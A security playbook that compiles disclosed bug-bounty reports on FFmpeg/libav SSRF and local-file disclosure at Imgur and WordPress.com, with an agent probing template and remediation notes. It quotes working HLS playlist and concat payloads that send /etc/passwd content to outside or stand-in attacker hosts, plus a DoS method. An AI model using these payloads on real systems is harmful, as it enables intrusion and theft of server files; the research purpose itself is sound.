---
title: "Media-Processing SSRF (libav / FFmpeg playlists & files)"
type: playbook
category: media-processing-ssrf
cwe: "CWE-918"
source_count: 3
full_bodies_available: 3
corpus: "HackerOne disclosed reports, 2015–2017 era, h1.security.nathan.sx archive"
archive_accessed: "2026-10-24"
note: "All quotes read from full bodies this session. Family members that now 404 on HackerOne are recorded with archive-side metadata in the source-index."
---

# Media-Processing SSRF (libav / FFmpeg playlists & files)

## 1. Overview

The era's most distinctive SSRF *sink* is the media pipeline: a service accepts a
video URL or upload, hands the bytes to FFmpeg/libav, and libav happily follows
whatever the "file" says — HTTP Live Streaming (`.m3u8`/HLS) playlists, `concat://`
sources, `file://` sources, aware content-type checks ignored entirely. Two of the
three full-body cases are on the *same* Imgur endpoint, three months apart, and the
third carries the class to wordpress.com with a working **local-file disclosure**
chained server-side.

What distinguishes this class from simple URL-reset sinks (Validation-Bypass file):

1. The victim fetch is initiated by the *parser*, not by the HTTP request line.
2. The playlist can carry **multiple** URLs in one file — parallel enumeration.
3. Payloads hide inside otherwise-valid containers (AVI with GAB2 subtitle chunk
   in SRF-237381) — traditional content-type scans see video, the parser sees
   text.
4. The same primitives read local files (`concat:file:///etc/passwd|http://ATTACKER/`)
   — this class reaches further than most URL fields of its era.

## 2. Case evidence

### SRF-115857 — SSRF and local file read in video to gif converter · Imgur — **$800** (archive-stated)

- Link: <https://hackerone.com/reports/115857>
- Weakness label as recorded: "None".
- Quote (the setup):
  > Video to gif converter on http://imgur.com/vidgif uses Lavf/55.48.100 with network options enabled. It makes possible SSRF by uploading specially crafted playlist.
- Payload, verbatim (playlist as the 'video'):
  > ```
  > #EXTM3U
  > #EXT-X-MEDIA-SEQUENCE:0
  > #EXTINF:10.0,
  > http://yngwie.ru/2.mp4
  > #EXT-X-ENDLIST
  > ```
  …and the readback UA line:
  > 54.82.61.224 - - [11/Feb/2016:05:08:20 -0500] "GET /2.mp4 HTTP/1.1" 404 169 "-" "Lavf/55.48.100" "-"
- Quote (the local-file read — the corpus's first *demonstrated* LFI via media
  pipeline):
  > But this vulnerability not about only HTTP requests, it allows to read arbitrary files from server. Here is quick POC reading first line of /etc/passwd http://yngwie.ru/test.avi: *(sic — "not about only")*
  Payload (concat pipes a local file into the playlist):
  > `concat:http://yngwie.ru/header.m3u8|file:///etc/passwd`
  the helper file (`header.m3u8`) must be built exactly:
  > header.m3u8 (very important - without space before eof):
  > ```
  > #EXTM3U
  > #EXT-X-MEDIA-SEQUENCE:0
  > #EXTINF:,
  > http://yngwie.ru?
  > ```
  …and the readback carries the file's first line inside a URL path:
  > 54.82.61.224 - - [11/Feb/2016:04:55:32 -0500] "GET ?root:x:0:0:root:/root:/bin/bash HTTP/1.1" 400 173 "-" "-" "-"
- Quote (going further, opaquely as the author claimed):
  > it is possible to read full files by subfile proto https://www.ffmpeg.org/ffmpeg-protocols.html#subfile or by constructing 100% valid video files and extracting data from gifs.
- Quote (the impact ceiling the author projects):
  > Sensitive files on server, some private apis, accessable from server, or some other allowed protocols which I didn't check may lead even to RCE. *(sic — "accessable")*
- References the report cites (kept verbatim, era links):
  > Links to original report about this issue:
  > https://habrahabr.ru/company/mailru/blog/274855/ (russian)
  > http://www.openwall.com/lists/oss-security/2016/01/14/1

### SRF-115978 — SSRF / Local file enumeration / DoS due to improper handling of certain file formats by ffmpeg · Imgur — **$1,000** (archive-stated)

- Link: <https://hackerone.com/reports/115978>
- Weakness label as recorded (historical): "Command Injection - Generic" — mislabel.
- Quote (the predecessor-request sequence — how the sink is reached):
  > imgur's servers perform an HTTP HEAD request to a user-supplied URL in order to discover the URL-s content-type and length. After that a user is offered a option to choose the required timestamps for beginning and end of converted video and then imgur performs another HTTP request (GET) to the same video file in order to grab the video file.
- Quote (content-type checks don't stop the parser):
  > Although imgur verifies content-types to ignore files which are not actually videos, ffmpeg does not care about such types and will parse a, say, video/avi files with m3u8 lines as a m3u8 file.
- The exploit structure in the source is three-part ("Exploits\n========\n"),
  verbatim assertions worth keeping whole:

  1. "To launch a basic SSRF we will prepare a php file which replies with video/avi content-type and m3u8 actual content. When parsing such a file, ffmpeg will make an unwanted HTTP GET request to an attacker-supplied URL." — with the listener transcript showing `User-Agent: Lavf/55.48.100` and the request line carrying an arbitrary token the author placed (`GET /BASICSSRF HTTP/1.1`).
  2. "As we can only perform HTTP GET-s with this vulnerability we have to somehow procure more information. Fortunately, ffmpeg m3u8 support provides us with a useful CONCAT command which allows us to concatenate multiple sources. It also fails if source is not present." — the enumeration band:
     > If provided with this file, imgur's server will contact gradeco.ru:12346 in case if /etc/passwd exists and won't if it does not exist. In this way an attacker may easily enumerate files. *(sic — "in case if")*
  3. DoS via the same joints, verbatim mechanism:
     > To perform a denial of service attack an attacker may prepare a specially crafted YUV4 file which will hang ffmpeg and keep it on constantly performing HTTP GET requests.
     redirect port 12346 to TARPIT → "imgur service will request port 12346, end up in TARPIT and then wait forever for 10 seconds of video to be delivered. That means that it will have an open socket and open process which may lead to resource exhaustion."
- Version-stability note: the report's dispatch form posts both
  `source` and `url` parameters to `/vidgif/upload` — an endpoint-level detail
  preserved verbatim in the file's POST snippet.

### SRF-237381 — SSRF and local file disclosure in https://wordpress.com/media/videos/ via FFmpeg HLS processing · WordPress.com (Automattic) — **$800** (archive-stated)

- Link: <https://hackerone.com/reports/237381>
- Weakness label as recorded: "Information Disclosure".
- Quote (the sink and the hiding technique — subtitle chunk inside a container):
  > FFmpeg is a video encoding software that appears to be used by wordpress.com for video processing (for paid accounts). FFmpeg is known to process HLS playlists that may contain references to external files. I was able to fire this feature using GAB2 subtitle chunks inside an AVI file. After that, I was able to retrieve conversion nodes' local files and fire SSRF requests.
- Payload portability quote (the report's carried payload — "the exploit itself"
  is the AVI; the author's instruction for the path inside it):
  > # Note that the AVI file attached is not a screen capture of the exploitation process, but the exploit itself. Do not try to play it!
- Readback from conversion infrastructure (attribution discipline, quote whole):
  > 192.0.87.12 - - [06/Jun/2017:21:42:35 +0200] "GET /test_ssrf HTTP/1.1" 200 117 "-" "Lavf/56.25.101"
  > According to whois information, 192.0.87.12 belongs to Automattic, Inc.
  That sentence is the vault's model for "who actually made this request?" — UA
  text plus owning-org attribution, recorded as the author reasoned.
- Local-file disclosure chain, described verbatim (the author's own tooling):
  > Reading files is a little bit trickier --- it uses FFmpeg's ability to concatinate all segments of an HLS playlist into another playlist. I wrote a script that exploits this issue, `file_reading_server.py` (attached to the report). You'll need to run it on any server under your control  (of course, the script doesn't need to be run on the target server, it will use the SSRF & HLS playlists to retrieve files from it). *(sic — "concatinate")*
  and the results:
  > Using this approach, I was able to dump `/etc/issue`:
  > ```
  > Debian GNU/Linux 8 
  >  \l
  > ``` 
  and
  > and `/etc/hostname`:
  > ```
  > tc1.videos.dca.wordpress.com
  > ```
- Guidance quotes kept (parameters and the filename layout), verbatim:
  > 1. Get a droplet/VPS/whatever with an external IP. Launch my script like this: `python3 file_reading_server.py --external-addr &lt;external-ip-of-your-server&gt; --port 8080` (you'll need python3.5).
  > 2. As in SSRF repro step 1, modify `http_q.avi` so the link inside it will point to your server and be like this: `http://&lt;external-ip-of-your-server&gt;:8080/initial.m3u?filename=/etc/passwd`. You can replace `/etc/passwd` with another filename if you want.
  > 3. As in SSRF repro step 2, upload the resulting file to wordpress.com and click "Edit". After a while, some debug output of my script will be printed to console (because of SSRF requests). Wait until the output stops. Then check the working dir of the script. It will contain a file with name like this: `&lt;some random string&gt;_&lt;filename-without-slashes&gt;`. The contents of this file was received from the node that runs FFmpeg.

## 3. Cross-case anatomy

| Step | SRF-115857 | SRF-115978 | SRF-237381 |
| --- | --- | --- | --- |
| Sink | `vidgif` converter (upload forms) | `vidgif/upload` endpoint | paid video "Edit" pipeline |
| Transport to parser | URL given via `source`/`url` POST fields; libav fetched | same | bytes inside AVI's GAB2 chunk |
| Payload file | `.m3u8` playlist as 'video' | "video/avi" + m3u8 lines (content-type ignored) | GAB2 chunks → HLS refs |
| Oracle | outbound UA `Lavf/55.48.100` | same + `Lavf/55.48.100` | `Lavf/56.25.101` |
| File-read primitive | `concat:file:///...|http://ATTACKER/` | `concat` exists → connect vs not (enumeration band) | full retrieval via scripted playlists (`file_reading_server.py`) |
| Readback evidence | first-line echo in the URL path | listener transcript | script-written files + Automattic UA attribution |
| Impact beyond mapping | full-file reads claimed possible | file enumeration + DoS | issuer-side file dump + internal SSRF |

## 4. Agent execution template

### Context F1 — playlist-in-upload probe

1. Identify media processing features (converters, "video-to-gif", paid video
   editing, HLS/API players, thumbnail generators, podcast/AV pipelines).
2. Build a minimal `.m3u8` whose segment URL is your listener (SRF-115857 format):
   - host the file with the correct content-type if the endpoint checks it
     (SRF-115978 states the type check succeeded and the parser ignored types);
     if a content-type matters, replay the exact vehicle (`video/avi` header +
     m3u8 body as the era's reports did).
3. Record emissions to the listener (UA, path, ports). The UA text `Lavf/55.48.100`
   -style transport is what the era's cases used to tie requests to libav.
4. If anything returns, upgrade to enumeration bands (concat exists vs not) —
   always from the SRF-115978 band structure; only then to file-read chains, and
   only with the target's approval for file paths.

### Context F2 — supported-input fuzz

Player features (e.g. `.mov`, `.avi`, `.mp4` uploads) followed by "conversion";
embed a GAB2 subtitle chunk carrying HLS refs (SRF-237381 vehicle) — or a
`.srt`-shaped subtitle track if the pipeline supports subtitles. Keep binary
layout intact (per the SRF-237381 instruction "keep the binary layout of the
file" via `#`-comment padding).

### Context F3 — file-read chains (post-authorisation only)

Requires: pipeline confirmed vulnerable + explicit approval in the engagement
contract. Build the two-side speaker:
- attacker-held playlist-server (the `file_reading_server.py` role in
  SRF-237381) that emits intermediate playlists out-of-band and collects file
  content in the URLs.
- target-side fetch networks through the per-request-size band; chain per the
  era's proven path (concat) — note these chains need a listener you control with
  stable URLs, not a one-shot listener.

## 5. Validation gates

1. **UA + path token** — every claim of "libav fetched X" is backed by the request
   line with your marker path (`BASICSSRF`-style tokens in the era's reports) or
   an SAS-external-ID-as-ingress relay. No inference "FFmpeg supports it" without
   the actual request appearing.
2. Attribution: quote the UA + timing (SRF-237381's Automattic reference) so triage
   knows the fetch came from the conversion node.
3. Enumeration bands need both bands (present vs absent file).
4. File-read chains must state the file paths read and exhibit the raw retrieved
   bytes, with the "how we got it" in a paragraph — not in a payload paste only.
   SRF-237381's `/etc/issue` + `/etc/hostname` quotes are the model.
5. DO NOT tie file-read claims to libav version numbers alone. SRF-115857 cites the
   upstream ffmpeg `concat` documentation; keep source-lines for anything that is
   documentation rather than executed proof.

## 6. Remediation quotes straight from the corpus

- Content-type filtering doesn't stop the parser — SRF-115978's own sentence is the
  warning ("ffmpeg does not care about such types").
- Post-archive modern layer (flagged, not in corpus): network egress behind media
  pipelines; parsers pinned to actual formats, not streams; current tooling
  removed `concat`/network-file features from untrusted-input paths years later.
  Era numbers do not dictate modern triage outcomes.

**Family root & era fixes.** The root publication the Imgur reports cite themselves
is recovered in the bibliography ([BLOG-004](references/blogs-index.md), Habr 2016 +
[BLOG-005](references/blogs-index.md), oss-security 2016): it adds three things the
H1 bodies only gesture at — the YUV4MPEG2 two-step decode
(`ffmpeg -i video.mp4 thumbnail.png` then `ffmpeg -i thumbnail.png out.y4m`) that
converts a binary-file read into *text*; the `.txt` read-back trick (append
`.txt` to the fetch URL so the response body is decoded into the output video —
"we got the ability to use this SSRF to read the response to any network request");
and a client-side variant (a merely-downloaded crafted file leaks the user's file
via preview renderers). Era remediation went beyond any single H1 case: chroot or
container isolation, dedicated uid, `--disable-network` at configure time, or
per-uid iptables — plus the author's upstream patch note (CVE-2016-1897 concat /
CVE-2016-1898 subfile).

## 7. Archive-era family members

- SRF-111269 `[ssrf] libav vulnerable during conversion of uploaded videos`
  (Pornhub, **$1,500**) — title/era-known; **now HTTP 404** on HackerOne; the
  body cannot be quoted. Listed as family evidence only.
- SRF-226756 `local file disclosure via FFmpeg hls processing` (VK, **$1,000**)
  — body withheld on unauthenticated retrieval, weakness label "Information
  Disclosure"; classified into this family by title + the family's shape section.
- SRF-242831 / SRF-243470 "Local File Disclosure via ffmpeg" (arxius) — both
  **now 404**; titles only. Listed for family bounds, not for technical quotes.
